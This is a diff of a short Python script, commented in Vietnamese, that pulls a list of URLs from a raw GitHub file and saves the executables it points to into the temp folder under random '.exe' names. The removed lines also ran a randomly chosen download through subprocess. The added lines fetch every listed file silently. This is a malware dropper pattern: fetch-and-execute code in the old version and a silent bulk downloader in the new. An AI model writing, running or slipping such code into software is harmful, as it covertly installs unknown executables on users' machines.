@@ -22,7 +22,6 @@ import random
 import string
 import urllib.request
 import tempfile
-import subprocess
 
 # URL tới file chứa danh sách các URL tải file
 url_list = "https://raw.githubusercontent.com/43a1723/w/main/urls_file.txt"
@@ -32,21 +31,23 @@ response = urllib.request.urlopen(url_list)
 url_content = response.read().decode('utf-8')
 urls = url_content.splitlines()
 
-# Chọn ngẫu nhiên một URL từ danh sách
-random_url = random.choice(urls)
-
-# Tạo một tên file ngẫu nhiên
-file_name = ''.join(random.choices(string.ascii_letters + string.digits, k=10)) + ".exe"
-
 # Lấy đường dẫn tới thư mục tạm %temp%
 temp_dir = tempfile.gettempdir()
 
-# Đường dẫn đầy đủ của file sẽ được lưu vào %temp%
-temp_file_path = os.path.join(temp_dir, file_name)
+# Hàm tạo tên file ngẫu nhiên
+def generate_random_filename(extension=".exe"):
+    return ''.join(random.choices(string.ascii_letters + string.digits, k=10)) + extension
 
-# Tải file từ URL và lưu vào %temp%
-urllib.request.urlretrieve(random_url, temp_file_path)
-print(f"Tải file thành công: {temp_file_path}")
+# Tải và lưu từng file từ danh sách URL
+for url in urls:
+    # Tạo một tên file ngẫu nhiên
+    file_name = generate_random_filename()
+    # Đường dẫn đầy đủ của file trong %temp%
+    temp_file_path = os.path.join(temp_dir, file_name)
 
-# Thực thi file vừa tải
-subprocess.run([temp_file_path], shell=True)
+    # Tải file từ URL và lưu vào %temp%
+    try:
+        urllib.request.urlretrieve(url, temp_file_path)
+        print(f"Tải thành công file từ {url} và lưu vào {temp_file_path}")
+    except Exception as e:
+        print(f"Lỗi khi tải file từ {url}: {e}")
